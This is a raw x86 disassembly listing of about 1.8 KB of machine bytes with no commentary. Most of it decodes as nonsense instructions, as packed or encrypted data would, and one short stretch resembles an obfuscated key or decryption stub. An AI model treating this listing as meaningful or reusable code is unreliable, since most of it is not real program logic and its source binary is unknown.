  409a02:	add    bh,BYTE PTR [ebp-0x2ba05b7c]
  409a08:	iret   
  409a09:	fistp  WORD PTR [eax]
  409a0b:	(bad)  
  409a0c:	ins    BYTE PTR es:[edi],dx
  409a0d:	sbb    al,0x5d
  409a0f:	xor    dh,BYTE PTR [edi-0xd1b2494]
  409a15:	popf   
  409a16:	and    eax,0x1dacfa94
  409a1b:	jp     0x409a89
  409a1d:	outs   dx,DWORD PTR ds:[esi]
  409a1e:	popa   
  409a1f:	in     eax,0xa8
  409a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a22:	cld    
  409a23:	adc    cl,BYTE PTR [esi-0x1a0c2860]
  409a29:	xchg   edx,eax
  409a2a:	je     0x4099d4
  409a2c:	jmp    0x409a37
  409a2e:	cmp    edx,ebx
  409a30:	mov    esi,0x1e80698e
  409a35:	dec    esi
  409a36:	es inc ecx
  409a38:	jo     0x409a73
  409a3a:	jle    0x4099e4
  409a3c:	push   esi
  409a3d:	(bad)  
  409a3e:	aam    0x11
  409a40:	test   dh,ch
  409a42:	jae    0x409a06
  409a44:	shl    BYTE PTR [ebp+edx*2+0x79],cl
  409a48:	js     0x409a56
  409a4a:	xchg   edi,eax
  409a4b:	stos   BYTE PTR es:[edi],al
  409a4c:	push   edi
  409a4d:	or     esi,ebx
  409a4f:	in     eax,0xd9
  409a51:	fadd   DWORD PTR [eax-0x5a]
  409a54:	inc    edx
  409a55:	pop    edi
  409a56:	inc    ecx
  409a57:	mov    ds:0x276160b0,eax
  409a5c:	div    DWORD PTR [ebx+0x597562c5]
  409a62:	repnz pop edi
  409a64:	in     al,0x21
  409a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a67:	xchg   esp,eax
  409a68:	pop    esp
  409a69:	fistp  QWORD PTR [esi]
  409a6b:	add    BYTE PTR [ebx+0x65bef35f],0x8b
  409a72:	dec    esp
  409a73:	int3   
  409a74:	cmp    edx,DWORD PTR [ebx+0x9a8cf42]
  409a7a:	clc    
  409a7b:	sbb    eax,0x99379b9f
  409a81:	xor    ebx,esi
  409a83:	and    DWORD PTR [edi+0x35],0xf6fcf19a
  409a8a:	mov    dh,0x2d
  409a8c:	xor    al,0x1d
  409a8e:	or     eax,0x65197287
  409a93:	call   0x50ba96ed
  409a98:	jnp    0x409a74
  409a9a:	push   esi
  409a9b:	in     eax,0x48
  409a9d:	mov    ch,BYTE PTR [edi]
  409a9f:	jno    0x409a6f
  409aa1:	icebp  
  409aa2:	fistp  WORD PTR [esi+edi*4+0x614be42]
  409aa9:	icebp  
  409aaa:	sbb    ebx,0xc35e6a6
  409ab0:	(bad)  
  409ab1:	repz jp 0x409af3
  409ab4:	inc    ecx
  409ab5:	sbb    BYTE PTR [eax],ch
  409ab7:	mov    ecx,0x699fa60e
  409abc:	mov    edx,0x99518a74
  409ac1:	scas   eax,DWORD PTR es:[edi]
  409ac2:	xchg   edi,eax
  409ac3:	mov    ds:0x79d157c0,eax
  409ac8:	sbb    eax,0x8748e922
  409acd:	cmp    al,0xb7
  409acf:	dec    ebx
  409ad0:	jbe    0x409a59
  409ad2:	push   0x43
  409ad4:	add    DWORD PTR [ecx+0x60],eax
  409ad7:	imul   ebx,DWORD PTR [ecx+ebx*1],0x5f1e4b7f
  409ade:	xchg   DWORD PTR [ebx+ebx*4],esp
  409ae1:	lea    ebx,[edi-0xcc2c47d]
  409ae7:	imul   ecx,DWORD PTR [ebx+0x14],0xc3a2618c
  409aee:	xor    al,0x78
  409af0:	mov    dh,0xb0
  409af2:	pop    ds
  409af3:	mov    fs,WORD PTR [ebx]
  409af5:	mov    ds:0x2699e12e,eax
  409afa:	stos   BYTE PTR es:[edi],al
  409afb:	test   al,0xf
  409afd:	pop    edi
  409afe:	cld    
  409aff:	inc    edx
  409b00:	sub    BYTE PTR [edx],al
  409b02:	mov    edx,0x22ae10ef
  409b07:	mov    ecx,0x415dfac2
  409b0c:	push   eax
  409b0d:	and    BYTE PTR [esi-0x38063cc9],cl
  409b13:	gs cli 
  409b15:	push   ds
  409b16:	(bad)  
  409b18:	das    
  409b19:	scas   eax,DWORD PTR es:[edi]
  409b1a:	dec    ebp
  409b1b:	sbb    esi,eax
  409b1d:	cmc    
  409b1e:	xor    dl,ch
  409b20:	sahf   
  409b21:	leave  
  409b22:	dec    esp
  409b23:	dec    ecx
  409b24:	jo     0x409af9
  409b26:	push   esp
  409b27:	repnz cmp eax,esp
  409b2a:	jo     0x409b40
  409b2c:	fisub  WORD PTR [ecx-0x61]
  409b2f:	lds    esp,FWORD PTR [ebx-0x7392ed1a]
  409b35:	jmp    0x84bf:0x70dae11d
  409b3c:	rol    DWORD PTR [eax+0x8b5ca2c],1
  409b42:	inc    eax
  409b43:	or     dl,BYTE PTR [edx-0x15b1a434]
  409b49:	hlt    
  409b4a:	and    BYTE PTR [ebx-0x5b682c9f],ah
  409b50:	sub    eax,0xd035d56f
  409b55:	mov    cl,0x2
  409b57:	pop    ss
  409b58:	les    edx,FWORD PTR [edi]
  409b5a:	mov    ebx,0x5f01c632
  409b5f:	ja     0x409b3f
  409b61:	retf   
  409b62:	sbb    al,0x6a
  409b64:	dec    ecx
  409b65:	pop    esi
  409b66:	into   
  409b67:	sahf   
  409b68:	pop    edx
  409b69:	pushf  
  409b6a:	sahf   
  409b6b:	mov    DWORD PTR [ebp-0x40],eax
  409b6e:	sub    DWORD PTR ds:0x434703,edx
  409b74:	mov    eax,0x7510851
  409b79:	mov    edi,DWORD PTR ds:0x43465f
  409b7f:	or     DWORD PTR ds:0x4346cf,edi
  409b85:	xor    edx,eax
  409b87:	xor    ecx,ecx
  409b89:	add    ecx,DWORD PTR ds:0x4346ff
  409b8f:	xor    DWORD PTR ds:0x434703,ecx
  409b95:	mov    ecx,0x327299
  409b9a:	add    edx,ecx
  409b9c:	mov    DWORD PTR [ebp-0x8],edx
  409b9f:	inc    edi
  409ba0:	mov    edx,DWORD PTR [ebp+0x8]
  409ba3:	xor    edx,eax
  409ba5:	add    edx,ecx
  409ba7:	mov    DWORD PTR [ebp+0xc],edx
  409baa:	mov    DWORD PTR [ebp-0x4],0xf89c85d6
  409bb1:	mov    edx,DWORD PTR ds:0x4346eb
  409bb7:	mov    edi,DWORD PTR ds:0x4347a3
  409bbd:	sub    edx,edi
  409bbf:	add    edx,DWORD PTR [edx+edi*1]
  409bc2:	jmp    0x409fd9
  409bc7:	xor    BYTE PTR [esp+edi*4],bl
  409bca:	xchg   ebp,eax
  409bcb:	mov    esp,0xd4bd31b5
  409bd0:	stos   BYTE PTR es:[edi],al
  409bd1:	cs pusha 
  409bd3:	dec    esi
  409bd4:	fld    st(0)
  409bd6:	push   0xffffff8e
  409bd8:	jmp    0x7e7e:0x79707e7e
  409bdf:	mov    esp,0xfb21224c
  409be4:	pop    ss
  409be5:	or     ebx,DWORD PTR [ecx+0x6b]
  409be8:	nop
  409be9:	jne    0x409baf
  409beb:	cmp    al,0x15
  409bed:	pop    eax
  409bee:	test   eax,0x928c171d
  409bf3:	scas   eax,DWORD PTR es:[edi]
  409bf4:	ret    
  409bf5:	test   BYTE PTR [edi+0x4c336671],ah
  409bfb:	xchg   ecx,eax
  409bfc:	jmp    0x409c45
  409bfe:	pop    ebx
  409bff:	sub    dl,ah
  409c01:	jno    0x409c47
  409c03:	sub    BYTE PTR [ebp-0x68],dh
  409c06:	hlt    
  409c07:	cmp    eax,DWORD PTR ds:0xcbd530b6
  409c0d:	sub    BYTE PTR [ecx],dl
  409c0f:	adc    DWORD PTR [ebx],eax
  409c11:	mov    cl,0x31
  409c13:	mov    al,0x8d
  409c15:	pushf  
  409c16:	repz pop ecx
  409c18:	mov    cl,0x4c
  409c1a:	imul   ecx,eax,0x445e7d75
  409c20:	std    
  409c21:	mov    DWORD PTR [ecx+0x19],esi
  409c24:	(bad)  [ebp+0x34]
  409c27:	pop    eax
  409c28:	lock cmp eax,0x7d3d6e87
  409c2e:	ror    ah,1
  409c30:	add    eax,0xb831264c
  409c35:	push   ebx
  409c36:	mov    eax,0x2c366c83
  409c3b:	popa   
  409c3c:	retf   
  409c3d:	call   0xde0fc484
  409c42:	cmp    edi,DWORD PTR [edx-0x4a]
  409c45:	loope  0x409c61
  409c47:	in     eax,0x4c
  409c49:	loope  0x409bd6
  409c4b:	pop    ss
  409c4c:	adc    DWORD PTR [edx+0x6244d192],0x5988194d
  409c56:	xchg   esi,eax
  409c57:	and    eax,0x1c4c05c3
  409c5c:	dec    ecx
  409c5d:	aad    0xf9
  409c5f:	pop    edx
  409c60:	mov    cl,0xdd
  409c62:	std    
  409c63:	push   0xd34fb0fd
  409c68:	sbb    al,cl
  409c6a:	adc    DWORD PTR [esi],ecx
  409c6c:	mov    edx,0xae15702f
  409c71:	mov    bl,0xc7
  409c73:	enter  0x58ba,0x39
  409c77:	inc    ecx
  409c78:	pop    es
  409c79:	ss xchg ebp,eax
  409c7b:	xchg   ebx,eax
  409c7c:	jp     0x409c85
  409c7e:	aam    0x4b
  409c80:	mov    esi,0x42f55c68
  409c85:	inc    edx
  409c86:	leave  
  409c87:	lock xchg esi,eax
  409c89:	sbb    BYTE PTR [edx+0x53df40f],0xd4
  409c90:	pop    esp
  409c91:	popf   
  409c92:	jb     0x409c53
  409c94:	sub    esp,DWORD PTR [esi+eax*8+0x5968bc8f]
  409c9b:	repnz pop es
  409c9d:	sbb    edi,ebp
  409c9f:	aam    0xed
  409ca1:	dec    ebx
  409ca2:	and    DWORD PTR [ebp+0x14],0x33
  409ca6:	hlt    
  409ca7:	outs   dx,DWORD PTR ds:[esi]
  409ca8:	in     al,0x29
  409caa:	mov    ah,0x4f
  409cac:	push   edx
  409cad:	xor    edx,DWORD PTR [esi+0x51]
  409cb0:	sub    BYTE PTR [ebx-0x28],0x6
  409cb4:	rcr    ecx,1
  409cb6:	and    DWORD PTR [edx+0x6cec3dab],ecx
  409cbc:	shr    dh,cl
  409cbe:	fsub   QWORD PTR [edi]
  409cc0:	dec    edx
  409cc1:	dec    eax
  409cc2:	stos   DWORD PTR es:[edi],eax
  409cc3:	mov    ds:0x7559fef6,al
  409cc8:	repz mov esp,DWORD PTR [edx]
  409ccb:	sti    
  409ccc:	outs   dx,BYTE PTR ds:[esi]
  409ccd:	push   ds
  409cce:	jno    0x409cbd
  409cd0:	xor    al,0xcc
  409cd2:	stos   BYTE PTR es:[edi],al
  409cd3:	adc    al,0x8
  409cd5:	jmp    0x2ee3:0x62863209
  409cdc:	shl    ebp,0x7
  409cdf:	pusha  
  409ce0:	test   BYTE PTR [ebp-0x23],bh
  409ce3:	mov    ds:0x999fd29d,eax
  409ce8:	mov    bl,0x17
  409cea:	push   ebp
  409ceb:	call   0x8c71:0x5ab0025c
  409cf2:	pop    ecx
  409cf3:	mov    ah,0xa9
  409cf5:	or     edi,DWORD PTR [ebp+0x6d632833]
  409cfb:	cli    
  409cfc:	xchg   ebp,eax
  409cfd:	jmp    0x409cbd
  409cff:	test   al,0xf0
  409d01:	outs   dx,DWORD PTR ds:[esi]
  409d02:	addr16 jmp 0x53aa:0xe1530b00
  409d0a:	pop    ebx
  409d0b:	push   ss
  409d0c:	jae    0x409d8b
  409d0e:	sub    edx,eax
  409d10:	inc    ebp
  409d11:	in     eax,0xe4
  409d13:	ss mov eax,0xeb13d6e6
  409d19:	push   eax
  409d1a:	mov    ah,BYTE PTR [edi+0x13a07e3b]
  409d20:	mov    ch,0xd4
  409d22:	call   0x56c66304
  409d27:	scas   eax,DWORD PTR es:[edi]
  409d28:	loope  0x409d06
  409d2a:	stos   DWORD PTR es:[edi],eax
  409d2b:	ins    DWORD PTR es:[edi],dx
  409d2c:	push   ds
  409d2d:	lods   eax,DWORD PTR ds:[esi]
  409d2e:	and    edx,DWORD PTR [ecx-0x1c442f0c]
  409d34:	sub    eax,0x55dd0cc7
  409d39:	mov    al,0x41
  409d3b:	mov    ebp,0x93bf84f9
  409d40:	pop    es
  409d41:	inc    ecx
  409d42:	jge    0x409d40
  409d44:	mov    esp,0xc3c41ba0
  409d49:	enter  0x2483,0x2b
  409d4d:	and    DWORD PTR [ebx+edx*2-0x52],ecx
  409d51:	loope  0x409dbf
  409d53:	mov    ebx,0xfde360b4
  409d58:	mov    edx,0xde50b79c
  409d5d:	ins    BYTE PTR es:[edi],dx
  409d5e:	dec    esp
  409d5f:	into   
  409d60:	push   ecx
  409d61:	hlt    
  409d62:	dec    ebx
  409d63:	push   ds
  409d64:	jbe    0x409d5f
  409d66:	cmp    al,0x19
  409d68:	mov    ebx,0x91eed568
  409d6d:	ins    DWORD PTR es:[edi],dx
  409d6e:	into   
  409d6f:	stc    
  409d70:	fwait
  409d71:	mov    dl,0x87
  409d73:	(bad)  
  409d74:	(bad)  [ebp+0x5578ee84]
  409d7a:	sbb    dh,bh
  409d7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d7d:	xchg   edx,eax
  409d7e:	add    BYTE PTR [eax+0x5efa6dbb],al
  409d84:	aam    0xf9
  409d86:	cmp    eax,0x44bc0552
  409d8b:	cmp    dh,BYTE PTR [ebp+0x1f]
  409d8e:	aad    0x3e
  409d90:	and    al,0xc1
  409d92:	or     BYTE PTR [edi+0x14b1ff61],dl
  409d98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d99:	jecxz  0x409d8a
  409d9b:	lahf   
  409d9c:	(bad)  
  409d9d:	es push eax
  409d9f:	cld    
  409da0:	stc    
  409da1:	inc    ecx
  409da2:	sti    
  409da3:	lods   eax,DWORD PTR ds:[esi]
  409da4:	push   ss
  409da5:	push   eax
  409da6:	(bad)  
  409da7:	int3   
  409da8:	adc    BYTE PTR [edi-0x6a27452a],dh
  409dae:	mov    edi,0x2f8c3601
  409db3:	loopne 0x409d5a
  409db5:	sbb    ah,0xd1
  409db8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409db9:	push   ss
  409dba:	dec    edi
  409dbb:	pop    esp
  409dbc:	(bad)  
  409dbe:	mov    eax,0x7c47ef49
  409dc3:	mov    ?,WORD PTR [ebp-0x13]
  409dc6:	and    BYTE PTR [eax+0x7d],ch
  409dc9:	pop    ss
  409dca:	add    DWORD PTR [ebx+0x69],edx
  409dcd:	jnp    0x409d79
  409dcf:	(bad)  
  409dd0:	in     eax,dx
  409dd1:	mov    bl,0xd0
  409dd3:	mov    esi,0x1e9431f5
  409dd8:	adc    BYTE PTR [eax+0x53],0x56
  409ddc:	stos   DWORD PTR es:[edi],eax
  409ddd:	(bad)  
  409ddf:	dec    edi
  409de0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409de1:	sub    eax,0x55d3521
  409de6:	fdivr  DWORD PTR [eax-0x49d26d98]
  409dec:	push   edx
  409ded:	int    0xbd
  409def:	fistp  WORD PTR [ecx+esi*2-0xf]
  409df3:	das    
  409df4:	ins    BYTE PTR es:[edi],dx
  409df5:	cwde   
  409df6:	shr    DWORD PTR [eax],cl
  409df8:	aaa    
  409df9:	jne    0x409e69
  409dfb:	addr16 pop ecx
  409dfd:	mov    al,ds:0x45a2366
  409e02:	into   
  409e03:	jle    0x409dd1
  409e05:	inc    BYTE PTR [eax+eiz*2]
  409e08:	idiv   BYTE PTR [ebx]
  409e0a:	stos   DWORD PTR es:[edi],eax
  409e0b:	sbb    cl,BYTE PTR [edx+0x38ab5dd6]
  409e11:	jb     0x409e46
  409e13:	xchg   edi,eax
  409e14:	stc    
  409e15:	xchg   edi,eax
  409e16:	imul   DWORD PTR [ebp-0x7adc650e]
  409e1c:	loopne 0x409da5
  409e1e:	cmp    edx,0xf5848c54
  409e24:	xchg   ebx,eax
  409e25:	loop   0x409df3
  409e27:	ins    DWORD PTR es:[edi],dx
  409e28:	jbe    0x409e15
  409e2a:	lea    ecx,[ebx+0x305ac26c]
  409e30:	out    dx,al
  409e31:	mov    ebp,0x40bc7559
  409e36:	adc    BYTE PTR [ebx+0x60],bl
  409e39:	test   al,0x3e
  409e3b:	mov    dl,0x77
  409e3d:	and    eax,0xa0f0d0fe
  409e42:	retf   
  409e43:	cwde   
  409e44:	mov    eax,0x85eeff4d
  409e49:	(bad)  
  409e4a:	or     eax,0x7c8a15f7
  409e4f:	scas   al,BYTE PTR es:[edi]
  409e50:	(bad)  
  409e51:	ss dec ebx
  409e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e54:	pop    es
  409e55:	mov    ah,0xba
  409e57:	mov    BYTE PTR [esp+eax*4],0x89
  409e5b:	(bad)  
  409e5c:	loopne 0x409edb
  409e5e:	dec    esp
  409e5f:	stc    
  409e60:	mov    edx,DWORD PTR [ebx-0x6348b751]
  409e66:	aas    
  409e67:	into   
  409e68:	neg    dh
  409e6a:	cld    
  409e6b:	loopne 0x409e2a
  409e6d:	and    DWORD PTR [eax+0x12],eax
  409e70:	adc    DWORD PTR [ebx-0x22],ebp
  409e73:	in     eax,dx
  409e74:	(bad)  
  409e75:	addr16 aas 
  409e77:	call   0x2508737c
  409e7c:	(bad)  [ebx-0x775f5a39]
  409e82:	rcl    DWORD PTR [ecx-0x5f],0xb2
  409e86:	adc    al,dh
  409e88:	lds    esi,FWORD PTR [edi]
  409e8a:	stos   BYTE PTR es:[edi],al
  409e8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e8c:	sub    DWORD PTR [ebp+0x511111fb],ecx
  409e92:	dec    eax
  409e93:	xor    BYTE PTR [ebx+0x16],ah
  409e96:	pop    ebx
  409e97:	gs jg  0x409e84
  409e9a:	ja     0x409e4d
  409e9c:	jmp    0x409eab
  409e9e:	inc    esp
  409e9f:	pop    esi
  409ea0:	add    al,0xa3
  409ea2:	iret   
  409ea3:	add    dl,BYTE PTR [ebp+0x59f16222]
  409ea9:	sbb    cl,ah
  409eab:	jl     0x409eac
  409ead:	stos   DWORD PTR es:[edi],eax
  409eae:	pop    ebp
  409eaf:	mov    esi,0x63e0a691
  409eb4:	jp     0x409e4f
  409eb6:	ret    0xd26f
  409eb9:	scas   eax,DWORD PTR es:[edi]
  409eba:	xor    al,dh
  409ebc:	jnp    0x409ebb
  409ebe:	xchg   ecx,eax
  409ebf:	push   edx
  409ec0:	outs   dx,DWORD PTR ds:[esi]
  409ec2:	dec    esi
  409ec3:	mov    ah,0x16
  409ec5:	mov    bl,BYTE PTR [ebp+ebp*4-0x1a]
  409ec9:	pop    ds
  409eca:	xchg   edi,eax
  409ecb:	jae    0x409eaa
  409ecd:	push   eax
  409ece:	ret    0x23e5
  409ed1:	push   edi
  409ed2:	pushf  
  409ed3:	lods   al,BYTE PTR ds:[esi]
  409ed4:	je     0x409e96
  409ed6:	inc    ecx
  409ed7:	repz idiv BYTE PTR cs:[edx+0x1]
  409edc:	(bad)  
  409edd:	mov    esp,0x4b97e77a
  409ee2:	inc    edi
  409ee3:	xor    edx,DWORD PTR [eax]
  409ee5:	lock pushf 
  409ee7:	inc    esp
  409ee8:	call   0x582a:0x6ca32dfb
  409eef:	mov    ebx,0x32d6ac05
  409ef4:	mov    WORD PTR [eax],?
  409ef6:	cwde   
  409ef7:	jbe    0x409e8c
  409ef9:	jae    0x409f17
  409efb:	int3   
  409efc:	outs   dx,DWORD PTR fs:[esi]
  409efe:	stc    
  409eff:	js     0x409e8d
  409f01:	lods   eax,DWORD PTR ds:[esi]
  409f02:	ins    BYTE PTR es:[edi],dx
  409f03:	fbstp  TBYTE PTR [edx-0x49284d]
  409f09:	stc    
  409f0a:	add    BYTE PTR [ebp+0x71],dl
  409f0d:	imul   esi,DWORD PTR ds:0x5a442ac,0x35
  409f14:	fidivr WORD PTR ds:0x6a5d212a
  409f1a:	js     0x409ef5
  409f1c:	aaa    
  409f1d:	sub    al,0xa7
  409f1f:	dec    esp
  409f20:	or     dl,0x34
  409f23:	push   DWORD PTR [ecx-0x56]
  409f26:	xchg   DWORD PTR [ebx],edx
  409f28:	pop    esp
  409f29:	mov    DWORD PTR ds:0xa3b54bcb,ebp
  409f2f:	mov    DWORD PTR [eax+0x67647335],ebx
  409f35:	pop    edi
  409f36:	pop    ss
  409f37:	adc    WORD PTR [eax+0x59],bp
  409f3b:	add    al,0xa4
  409f3d:	cmp    bh,BYTE PTR ds:0xdecab4c6
  409f43:	mov    ebx,0xab1b3ab6
  409f48:	jl     0x409fc3
  409f4a:	cs push ebx
  409f4c:	popa   
  409f4d:	dec    edx
  409f4e:	bound  edx,QWORD PTR [ecx-0x787449ae]
  409f54:	shr    BYTE PTR [esi+edx*1+0x8b69b65],0x67
  409f5c:	xchg   ecx,eax
  409f5d:	jnp    0x409fdc
  409f5f:	dec    edx
  409f60:	cld    
  409f61:	dec    eax
  409f62:	pop    ebp
  409f63:	psubusw mm2,mm3
  409f66:	jle    0x409fe7
  409f68:	cli    
  409f69:	push   ebp
  409f6a:	loopne 0x409fbb
  409f6c:	(bad)  
  409f6d:	repz std 
  409f6f:	dec    ebp
  409f70:	jae    0x409f96
  409f72:	sub    al,0x2e
  409f74:	(bad)  
  409f75:	ins    DWORD PTR es:[edi],dx
  409f76:	lds    eax,FWORD PTR [eax]
  409f78:	dec    esi
  409f79:	mov    ebp,0xf266fba5
  409f7e:	lods   al,BYTE PTR ds:[esi]
  409f7f:	repz popf 
  409f81:	mov    ds:0xc4d4ca2a,eax
  409f86:	mov    ebx,0x36b2b4aa
  409f8b:	jno    0x409f95
  409f8d:	rcr    BYTE PTR [ebp-0x4595426f],1
  409f93:	mov    al,0xc2
  409f95:	bound  edi,QWORD PTR [ebx]
  409f97:	push   eax
  409f98:	imul   edi,DWORD PTR [eax],0x26
  409f9b:	sar    BYTE PTR ds:0xe460dd53,0xe9
  409fa2:	xor    al,0x39
  409fa4:	leave  
  409fa5:	mov    ds:0x279ef82e,al
  409faa:	lea    ebx,[ecx-0x38]
  409fad:	test   bl,al
  409faf:	arpl   WORD PTR [esi],bx
  409fb1:	xor    bl,BYTE PTR [edi-0x2ed4f157]
  409fb7:	jnp    0x409f7b
  409fb9:	jp     0x409ffb
  409fbb:	add    eax,0x1705efa
  409fc0:	xchg   ebx,eax
  409fc1:	cmp    ch,BYTE PTR [eax]
  409fc3:	dec    ebx
  409fc4:	lds    ebp,FWORD PTR [ebx+0x5b3512f0]
  409fca:	fisttp QWORD PTR [esi+0x5d749480]
  409fd0:	js     0x409f5b
  409fd2:	mov    ds:0xa57b9a39,al
  409fd7:	ins    DWORD PTR es:[edi],dx
  409fd8:	rol    edi,1
  409fda:	inc    ebp
  409fdb:	fdivr  DWORD PTR [eax]
  409fdd:	test   DWORD PTR [eax+edi*8+0x12e9ff23],ebx
  409fe4:	add    al,0x0
  409fe6:	add    BYTE PTR [ecx+0x6b],ah
  409fe9:	in     al,dx
  409fea:	(bad)  
  409feb:	cld    
  409fec:	popf   
  409fed:	popa   
  409fee:	imul   ebp,DWORD PTR [esi],0x0
  409ff1:	push   ebx
  409ff2:	fldenv [edi-0x72]
  409ff5:	push   ecx
  409ff6:	in     al,0x80
  409ff8:	idiv   BYTE PTR [esi+0x7e]
  409ffb:	jo     0x40a076
  409ffd:	jle    0x40a07d
  409fff:	ss add ebx,ecx
  40a002:	pop    esi
  40a003:	popf   
  40a004:	dec    ebx
  40a005:	add    al,0xf0
  40a007:	stos   BYTE PTR es:[edi],al
  40a008:	call   0x971b:0x288104a3
  40a00f:	cmp    ebx,ebx
  40a011:	fsub   QWORD PTR [edi-0x4c]
  40a014:	push   ss
  40a015:	or     cl,BYTE PTR [edx-0x79]
  40a018:	inc    edi
  40a019:	lock into 
  40a01b:	je     0x40a05a
  40a01d:	sub    dl,BYTE PTR [edi-0x47]
  40a020:	in     eax,0xd2
  40a022:	rol    BYTE PTR [ebx],0x93
  40a025:	dec    ebp
  40a026:	fld    DWORD PTR [ebp-0x1a00d541]
  40a02c:	pusha  
  40a02d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a02e:	fisttp DWORD PTR [edi+0x9]
  40a031:	mov    WORD PTR es:[ebx+edx*1-0x28],ss
  40a036:	call   FWORD PTR [ebp+edx*8-0x2d]
  40a03a:	sti    
  40a03b:	xchg   edx,eax
  40a03c:	jecxz  0x40a03f
  40a03e:	mov    DWORD PTR [esp+eiz*8+0x405c5d9b],edx
  40a045:	popf   
  40a046:	sbb    DWORD PTR [ebp+0x2653d444],edx
  40a04c:	outs   dx,BYTE PTR ds:[esi]
  40a04d:	and    al,0xd5
  40a04f:	mov    ebx,0xe0b44fb2
  40a054:	int3   
  40a055:	in     eax,dx
  40a056:	adc    eax,0xe887f6a8
  40a05b:	rol    BYTE PTR [esi+0x329000],1
  40a061:	xchg   esp,eax
  40a062:	xchg   esp,eax
  40a063:	push   edi
  40a064:	cmovg  ecx,DWORD PTR [ecx+0x4d7fee0d]
  40a06b:	inc    edx
  40a06c:	and    al,0x1a
  40a06e:	xchg   edi,eax
  40a06f:	(bad)  
  40a070:	cmp    eax,0x8a9eee29
  40a075:	pop    ebp
  40a076:	pop    esi
  40a077:	call   0xab1a:0x8de42d8
  40a07e:	sbb    DWORD PTR [ecx],edi
  40a080:	mov    dh,0x35
  40a082:	xor    al,0x91
  40a084:	retf   
  40a085:	sbb    eax,0x21479689
  40a08a:	call   0x8e8a280c
  40a08f:	jmp    0x4a32c4f5
  40a094:	push   ecx
  40a095:	or     DWORD PTR [eax+0x14e887cb],esp
  40a09b:	lds    eax,FWORD PTR [edx+ebp*8]
  40a09e:	(bad)  
  40a09f:	aas    
  40a0a0:	call   0x7636687
  40a0a5:	mov    edx,0xb8398e14
  40a0aa:	fcom   QWORD PTR [ebx+0x2f95b526]
  40a0b0:	hlt    
  40a0b1:	push   edi
  40a0b2:	outs   dx,DWORD PTR ds:[esi]
  40a0b3:	pop    ds
  40a0b4:	ret    
  40a0b5:	pop    eax
  40a0b6:	ins    BYTE PTR es:[edi],dx
  40a0b7:	dec    ebx
  40a0b8:	in     eax,0x51
  40a0ba:	stc    
  40a0bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0bc:	adc    ecx,edi
  40a0be:	outs   dx,DWORD PTR ds:[esi]
  40a0bf:	add    ebx,DWORD PTR [edi]
  40a0c1:	clc    
  40a0c2:	sub    ah,al
  40a0c4:	inc    eax
  40a0c5:	push   es
  40a0c6:	mov    bh,0xc
  40a0c8:	add    eax,0x4ceea063
  40a0cd:	mov    bl,0x6d
  40a0cf:	dec    edi
  40a0d0:	mov    ds:0x2c54dbc1,al
  40a0d5:	call   0xbd954afa
  40a0da:	pop    ss
  40a0db:	mov    ecx,0x2a7b8366
  40a0e0:	sbb    ch,BYTE PTR [edx]
  40a0e2:	stos   DWORD PTR es:[edi],eax
  40a0e3:	(bad)  
  40a0e4:	sahf   
  40a0e5:	out    dx,al
  40a0e6:	or     bh,BYTE PTR [ebx-0x63]
  40a0e9:	adc    eax,eax
  40a0eb:	mov    al,0x19
  40a0ed:	jb     0x40a09a
  40a0ef:	cmp    al,0xeb
  40a0f1:	dec    ebx
  40a0f2:	data16 (bad) 
  40a0f4:	xor    BYTE PTR [esi+0x59],bh
  40a0f7:	test   al,0x39
  40a0f9:	ja     0x40a0fd
  40a0fb:	loop   0x40a08a
  40a0fd:	daa    
  40a0fe:	jmp    0x1171:0x38301968
  40a105:	gs data16 ss (bad) 
  40a109:	xchg   edx,eax
  40a10a:	adc    al,0x72
  40a10c:	jmp    DWORD PTR [edi+0x4b0269a]
  40a112:	dec    esp
  40a113:	jmp    0x40a15f
  40a115:	cmp    ch,BYTE PTR [edi]
  40a117:	mov    WORD PTR [ecx-0x12],?
  40a11a:	and    al,0xff
  40a11c:	cmp    DWORD PTR ds:0xde18e3c6,eax
  40a122:	add    ebp,DWORD PTR [ebx-0xd]
  40a125:	sti    
  40a126:	stc    
  40a127:	addr16 push ss
  40a129:	pop    ss
  40a12a:	stc    
  40a12b:	push   esp
  40a12c:	jo     0x40a144
  40a12e:	pop    esp
  40a12f:	xlat   BYTE PTR ds:[ebx]
  40a130:	mov    dl,BYTE PTR [eax]
  40a132:	test   al,0x12
  40a134:	mov    ds:0xfe2f7194,al
  40a139:	pop    esp
  40a13a:	popf   
  40a13b:	xor    DWORD PTR [edi+0x4344171],edx
  40a141:	jg     0x40a0c6
  40a143:	pop    ebx
  40a144:	cmc    
  40a145:	loopne 0x40a15e
  40a147:	jno    0x40a128
  40a149:	int    0x32
  40a14b:	cmp    ah,dh
  40a14d:	jle    0x40a0d8
  40a14f:	xlat   BYTE PTR ds:[ebx]
  40a150:	cmp    al,0x6e
  40a152:	inc    ebp
  40a153:	sub    cl,ch
  40a155:	cwde   
  40a156:	fsubr  QWORD PTR ds:0x6047ec56
  40a15c:	data16 mov ah,0xa4
  40a15f:	jbe    0x40a1a1
  40a161:	in     eax,0xc4
  40a163:	and    eax,0xa16882cd
  40a168:	jle    0x40a1b2
  40a16a:	aas    
  40a16b:	mov    esp,0x78d75c74
  40a170:	mov    DWORD PTR ds:0xedfdabd,ecx
  40a176:	pusha  
  40a177:	loope  0x40a1cb
  40a179:	(bad)  [ebp+0x7207b5f0]
  40a17f:	xchg   BYTE PTR [eax+0x2d],al
  40a182:	and    al,0x37
  40a184:	mov    ch,0x4b
  40a186:	cmp    di,si
  40a189:	retf   0xeee0
  40a18c:	std    
  40a18d:	jle    0x40a1a6
  40a18f:	push   eax
  40a190:	mov    ebx,0x4b0ea0d3
  40a195:	or     DWORD PTR [ebp-0x27],0xffffffbd
  40a199:	pusha  
  40a19a:	pop    ebx
  40a19b:	push   ds
  40a19c:	push   DWORD PTR [edi]
  40a19e:	ficomp DWORD PTR [eax+0x3]
  40a1a1:	cwde   
  40a1a2:	and    DWORD PTR [ecx+0x79c58830],edi
  40a1a8:	out    0xf0,eax
